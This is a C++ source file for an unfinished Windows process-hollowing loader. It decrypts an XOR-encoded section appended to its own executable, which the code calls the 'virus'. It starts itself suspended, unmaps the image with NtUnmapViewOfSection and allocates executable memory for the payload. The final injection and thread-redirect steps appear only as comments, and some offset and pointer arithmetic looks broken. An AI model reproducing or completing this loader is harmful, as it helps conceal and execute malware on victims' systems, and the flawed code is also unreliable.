#include <stdio.h>
#include <Windows.h>
#include <vector>
#include <winternl.h>
using namespace std;

typedef struct DOS_HEADER {             // DOS .EXE header
    WORD   e_magic;                     // Magic number
    WORD   e_cblp;                      // Bytes on last page of file
    WORD   e_cp;                        // Pages in file
    WORD   e_crlc;                      // Relocations
    WORD   e_cparhdr;                   // Size of header in paragraphs
    WORD   e_minalloc;                  // Minimum extra paragraphs needed
    WORD   e_maxalloc;                  // Maximum extra paragraphs needed
    WORD   e_ss;                        // Initial (relative) SS value
    WORD   e_sp;                        // Initial SP value
    WORD   e_csum;                      // Checksum
    WORD   e_ip;                        // Initial IP value
    WORD   e_cs;                        // Initial (relative) CS value
    WORD   e_lfarlc;                    // File address of relocation table
    WORD   e_ovno;                      // Overlay number
    WORD   e_res[4];                    // Reserved words
    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)
    WORD   e_oeminfo;                   // OEM information; e_oemid specific
    WORD   e_res2[10];                  // Reserved words
    LONG   e_lfanew;                    // File address of new exe header
} __IMAGE_DOS_HEADER;

typedef struct DATA_DIRECTORY {
    DWORD VirtualAddress;
    DWORD Size;
} __IMAGE_DATA_DIRECTORY;

typedef struct FILE_HEADER {
    WORD    Machine;
    WORD    NumberOfSections;
    DWORD   TimeDateStamp;
    DWORD   PointerToSymbolTable;
    DWORD   NumberOfSymbols;
    WORD    SizeOfOptionalHeader;
    WORD    Characteristics;
} __IMAGE_FILE_HEADER;

typedef struct OPTIONAL_HEADER64 {
    WORD        Magic;
    BYTE        MajorLinkerVersion;
    BYTE        MinorLinkerVersion;
    DWORD       SizeOfCode;
    DWORD       SizeOfInitializedData;
    DWORD       SizeOfUninitializedData;
    DWORD       AddressOfEntryPoint;
    DWORD       BaseOfCode;
    ULONGLONG   ImageBase;
    DWORD       SectionAlignment;
    DWORD       FileAlignment;
    WORD        MajorOperatingSystemVersion;
    WORD        MinorOperatingSystemVersion;
    WORD        MajorImageVersion;
    WORD        MinorImageVersion;
    WORD        MajorSubsystemVersion;
    WORD        MinorSubsystemVersion;
    DWORD       Win32VersionValue;
    DWORD       SizeOfImage;
    DWORD       SizeOfHeaders;
    DWORD       CheckSum;
    WORD        Subsystem;
    WORD        DllCharacteristics;
    ULONGLONG   SizeOfStackReserve;
    ULONGLONG   SizeOfStackCommit;
    ULONGLONG   SizeOfHeapReserve;
    ULONGLONG   SizeOfHeapCommit;
    DWORD       LoaderFlags;
    DWORD       NumberOfRvaAndSizes;
    DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} __IMAGE_OPTIONAL_HEADER64;

typedef struct SECTION_HEADER {
    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
        DWORD   PhysicalAddress;
        DWORD   VirtualSize;
    } Misc;
    DWORD   VirtualAddress;
    DWORD   SizeOfRawData;
    DWORD   PointerToRawData;
    DWORD   PointerToRelocations;
    DWORD   PointerToLinenumbers;
    WORD    NumberOfRelocations;
    WORD    NumberOfLinenumbers;
    DWORD   Characteristics;
} __IMAGE_SECTION_HEADER;


typedef NTSTATUS(WINAPI* __NtQueryInformationProcess)(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    DWORD ProcessInformationLength,
    PDWORD ReturnLength
);

typedef NTSTATUS(WINAPI* __NtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

//typedef struct ___PROCESS_BASIC_INFORMATION {
//    NTSTATUS ExitStatus;
//    __PPEB PebBaseAddress;
//    ULONG_PTR AffinityMask;
//    KPRIORITY BasePriority;
//    ULONG_PTR UniqueProcessId;
//    ULONG_PTR InheritedFromUniqueProcessId;
//} __PROCESS_BASIC_INFORMATION;
//
//typedef struct ___PEB_LDR_DATA {
//    ULONG                   Length;
//    BOOLEAN                 Initialized;
//    PVOID                   SsHandle;
//    LIST_ENTRY              InLoadOrderModuleList;
//    LIST_ENTRY              InMemoryOrderModuleList;
//    LIST_ENTRY              InInitializationOrderModuleList;
//} __PEB_LDR_DATA, * __PPEB_LDR_DATA;
//
//typedef struct ___RTL_DRIVE_LETTER_CURDIR {
//    USHORT                  Flags;
//    USHORT                  Length;
//    ULONG                   TimeStamp;
//    UNICODE_STRING          DosPath;
//} __RTL_DRIVE_LETTER_CURDIR, * __PRTL_DRIVE_LETTER_CURDIR;
//
//typedef struct ___RTL_USER_PROCESS_PARAMETERS {
//    ULONG                   MaximumLength;
//    ULONG                   Length;
//    ULONG                   Flags;
//    ULONG                   DebugFlags;
//    PVOID                   ConsoleHandle;
//    ULONG                   ConsoleFlags;
//    HANDLE                  StdInputHandle;
//    HANDLE                  StdOutputHandle;
//    HANDLE                  StdErrorHandle;
//    UNICODE_STRING          CurrentDirectoryPath;
//    HANDLE                  CurrentDirectoryHandle;
//    UNICODE_STRING          DllPath;
//    UNICODE_STRING          ImagePathName;
//    UNICODE_STRING          CommandLine;
//    PVOID                   Environment;
//    ULONG                   StartingPositionLeft;
//    ULONG                   StartingPositionTop;
//    ULONG                   Width;
//    ULONG                   Height;
//    ULONG                   CharWidth;
//    ULONG                   CharHeight;
//    ULONG                   ConsoleTextAttributes;
//    ULONG                   WindowFlags;
//    ULONG                   ShowWindowFlags;
//    UNICODE_STRING          WindowTitle;
//    UNICODE_STRING          DesktopName;
//    UNICODE_STRING          ShellInfo;
//    UNICODE_STRING          RuntimeData;
//    __RTL_DRIVE_LETTER_CURDIR DLCurrentDirectory[0x20];
//} _RTL_USER_PROCESS_PARAMETERS, * _PRTL_USER_PROCESS_PARAMETERS;
//

typedef struct _PEB_FREE_BLOCK {
    _PEB_FREE_BLOCK* Next;
    ULONG                   Size;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

typedef void (*PPEBLOCKROUTINE)(PVOID PebLock);


typedef struct ___PEB {
    BOOLEAN                 InheritedAddressSpace;
    BOOLEAN                 ReadImageFileExecOptions;
    BOOLEAN                 BeingDebugged;
    BOOLEAN                 Spare;
    HANDLE                  Mutant;
    PVOID                   ImageBaseAddress;
    PPEB_LDR_DATA           LoaderData;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID                   SubSystemData;
    PVOID                   ProcessHeap;
    PVOID                   FastPebLock;
    PPEBLOCKROUTINE         FastPebLockRoutine;
    PPEBLOCKROUTINE         FastPebUnlockRoutine;
    ULONG                   EnvironmentUpdateCount;
    PVOID*                  KernelCallbackTable;
    PVOID                   EventLogSection;
    PVOID                   EventLog;
    PPEB_FREE_BLOCK         FreeList;
    ULONG                   TlsExpansionCounter;
    PVOID                   TlsBitmap;
    ULONG                   TlsBitmapBits[0x2];
    PVOID                   ReadOnlySharedMemoryBase;
    PVOID                   ReadOnlySharedMemoryHeap;
    PVOID*                  ReadOnlyStaticServerData;
    PVOID                   AnsiCodePageData;
    PVOID                   OemCodePageData;
    PVOID                   UnicodeCaseTableData;
    ULONG                   NumberOfProcessors;
    ULONG                   NtGlobalFlag;
    BYTE                    Spare2[0x4];
    LARGE_INTEGER           CriticalSectionTimeout;
    ULONG                   HeapSegmentReserve;
    ULONG                   HeapSegmentCommit;
    ULONG                   HeapDeCommitTotalFreeThreshold;
    ULONG                   HeapDeCommitFreeBlockThreshold;
    ULONG                   NumberOfHeaps;
    ULONG                   MaximumNumberOfHeaps;
    PVOID**                 ProcessHeaps;
    PVOID                   GdiSharedHandleTable;
    PVOID                   ProcessStarterHelper;
    PVOID                   GdiDCAttributeList;
    PVOID                   LoaderLock;
    ULONG                   OSMajorVersion;
    ULONG                   OSMinorVersion;
    ULONG                   OSBuildNumber;
    ULONG                   OSPlatformId;
    ULONG                   ImageSubSystem;
    ULONG                   ImageSubSystemMajorVersion;
    ULONG                   ImageSubSystemMinorVersion;
    ULONG                   GdiHandleBuffer[0x22];
    ULONG                   PostProcessInitRoutine;
    ULONG                   TlsExpansionBitmap;
    BYTE                    TlsExpansionBitmapBits[0x80];
    ULONG                   SessionId;
} __PEB, * __PPEB;

typedef struct _LOADED_IMAGE {
    PSTR                  ModuleName;
    HANDLE                hFile;
    PUCHAR                MappedAddress;
    PIMAGE_NT_HEADERS64   FileHeader;
    PIMAGE_SECTION_HEADER LastRvaSection;
    ULONG                 NumberOfSections;
    PIMAGE_SECTION_HEADER Sections;
    ULONG                 Characteristics;
    BOOLEAN               fSystemImage;
    BOOLEAN               fDOSImage;
    BOOLEAN               fReadOnly;
    UCHAR                 Version;
    LIST_ENTRY            Links;
    ULONG                 SizeOfImage;
} LOADED_IMAGE, * PLOADED_IMAGE;

#pragma warning(disable : 4996)
int main(int argc, char* argv[]) {

    printf("Hello program2\n");

    #pragma region load ntdll and get functions

    HMODULE hNTDLL = LoadLibraryA("ntdll");
    if (!hNTDLL)
        return 1;

    FARPROC fpNtQueryInformationProcess = GetProcAddress(hNTDLL, "NtQueryInformationProcess");
    if (!fpNtQueryInformationProcess)
        return 1;

    __NtQueryInformationProcess ntQueryInformationProcess = (__NtQueryInformationProcess)fpNtQueryInformationProcess;

    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    if (!fpNtUnmapViewOfSection)
        return 1;

    __NtUnmapViewOfSection NtUnmapViewOfSection = (__NtUnmapViewOfSection)fpNtUnmapViewOfSection;

    #pragma endregion


    #pragma region open running process and get virus section

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    FILE* retrofitting = fopen(path, "rb");

    if (!retrofitting) {
        printf("error opening files\n");
        return 1;
    }

    DOS_HEADER retrofitting_dos_header;
    fread(&retrofitting_dos_header, sizeof(DOS_HEADER), 1, retrofitting);


    FILE_HEADER retrofitting_file_header;
    fseek(retrofitting, retrofitting_dos_header.e_lfanew + sizeof(DWORD), SEEK_SET);
    fread(&retrofitting_file_header, sizeof(FILE_HEADER), 1, retrofitting);
    retrofitting_file_header.NumberOfSections += 1;

    OPTIONAL_HEADER64 retrofitting_optional_header;
    fseek(retrofitting, retrofitting_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER), SEEK_SET);
    fread(&retrofitting_optional_header, sizeof(OPTIONAL_HEADER64), 1, retrofitting);

    SECTION_HEADER section_header;
    SECTION_HEADER virus_section_header;
    DWORD max_virtual_address = 0;
    for (int i = 0; i < retrofitting_file_header.NumberOfSections - 1; i++) {
        fread(&section_header, sizeof(SECTION_HEADER), 1, retrofitting);
        if (section_header.VirtualAddress > max_virtual_address) {
            max_virtual_address = section_header.VirtualAddress;
            virus_section_header = section_header;
        }
    }

    // seek to the start of the virus section
    DWORD virus_address = (virus_section_header.VirtualAddress - virus_section_header.VirtualAddress) + virus_section_header.PointerToRawData;
    fseek(retrofitting, virus_address, SEEK_SET);
    
    // read and decrypt virus byte by byte
    BYTE virus_byte;
    vector<BYTE> virus;
    while (fread(&virus_byte, sizeof(BYTE), 1, retrofitting)) {
 	    virus_byte = virus_byte ^ 0x40;
    	virus.push_back(virus_byte);
    }

    // read virus DOS header from virus
    DOS_HEADER virus_dos_header;
    memcpy(&virus_dos_header, virus.data(), sizeof(DOS_HEADER));

    // read virus into file header from virus
    FILE_HEADER virus_file_header;
    memcpy(&virus_file_header, virus.data() + virus_dos_header.e_lfanew + sizeof(DWORD), sizeof(FILE_HEADER));

    // read virus optional header from virus
    OPTIONAL_HEADER64 virus_optional_header;
    memcpy(&virus_optional_header, virus.data() + virus_dos_header.e_lfanew + sizeof(DWORD) + sizeof(FILE_HEADER), sizeof(OPTIONAL_HEADER64));


    #pragma endregion



    // Create process in suspended form using CreateProcessA
    LPSTARTUPINFOA startup_info = new STARTUPINFOA();
    LPPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();
    BOOL result = CreateProcessA(NULL, path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startup_info, process_info);

    if (!result) {
        printf("error creating process\n");
        return 1;
    }


    // get context of retrofitting.exe (ImageBase and OEP)
    PROCESS_BASIC_INFORMATION p_basic_info = { 0 };
    DWORD return_length = 0;
    result = ntQueryInformationProcess(process_info->hProcess, 0, &p_basic_info, sizeof(p_basic_info), &return_length);
    if (result) {
		printf("error getting process information\n");
        printf("error code: %d\n", GetLastError());
		return 1;
	}

    __PEB* p_PEB = new __PEB();
    result = ReadProcessMemory(process_info->hProcess, (LPCVOID)p_basic_info.PebBaseAddress, p_PEB, sizeof(PEB), NULL);
    if (!result) {
        printf("error reading process memory at PebBaseAddress\n");
        printf("error code: %d\n", GetLastError());
        return 1;
    }


    /*BYTE* lp_buffer = new BYTE[0x2000];
    result = ReadProcessMemory(process_info->hProcess, p_PEB->ImageBaseAddress, lp_buffer, sizeof(lp_buffer), nullptr);
    if (!result) {
        delete[] lp_buffer;
        printf("error reading process memory at process ImageBaseAddress\n");
        return 1;
    }


    PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)lp_buffer;
    PLOADED_IMAGE p_image = new LOADED_IMAGE();

    p_image->FileHeader = (PIMAGE_NT_HEADERS64)(lp_buffer + p_dos_header->e_lfanew);
    p_image->NumberOfSections = p_image->FileHeader->FileHeader.NumberOfSections;
    p_image->Sections = (PIMAGE_SECTION_HEADER)(lp_buffer + p_dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS64));

    delete[] lp_buffer;*/


    // Clear space using NtUnmapViewOfSection
    DWORD unmap_result = NtUnmapViewOfSection(process_info->hProcess, p_PEB->ImageBaseAddress);
    if (unmap_result) {
        printf("error unmapping view of section\n");
        return 1;
    }

    // Allocate space using VirtualAllocEx at ImageBase of virus
    PVOID p_remote_image = VirtualAllocEx(process_info->hProcess, p_PEB->ImageBaseAddress, virus_optional_header.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!p_remote_image) {
    printf("error allocating space\n");
    return 1;
    }

    DWORD dwDelta = (DWORD)p_PEB->ImageBaseAddress - virus_optional_header.ImageBase;

    printf
    (
        "Source image base: 0x%p\r\n"
        "Destination image base: 0x%p\r\n",
        virus_optional_header.ImageBase,
        p_PEB->ImageBaseAddress
    );

    printf("Relocation delta: 0x%p\r\n", dwDelta);

    virus_optional_header.ImageBase = (DWORD)p_PEB->ImageBaseAddress;


    // If successful stretch vrius and copy into space using WriteProcessMemory


    // Modify context of retorfitting to ImageBase of virus and OEP of virus


    // Set the Contact and restore the main thread

    fclose(retrofitting);

    return 0;
}

